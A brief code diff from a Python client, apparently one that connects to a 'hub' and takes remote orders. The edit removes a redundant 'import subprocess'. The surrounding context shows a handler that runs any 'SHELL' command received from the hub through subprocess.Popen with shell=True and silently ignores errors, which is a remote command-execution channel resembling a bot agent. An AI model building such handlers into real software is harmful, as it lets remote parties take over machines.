@@ -2,7 +2,7 @@ import socket
 import time
 import os
 import sys
-import subprocess  # <--- THIS IS THE MISSING LINE
+import subprocess 
 import threading
 import shutil
 
@@ -833,7 +833,6 @@ def connect_to_hub(hub_ip, port):
                         # Syntax: SHELL "cmd"
                         try:
                             cmd_text = command.split('"')[1]
-                            import subprocess
                             subprocess.Popen(cmd_text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                         except:
                             pass
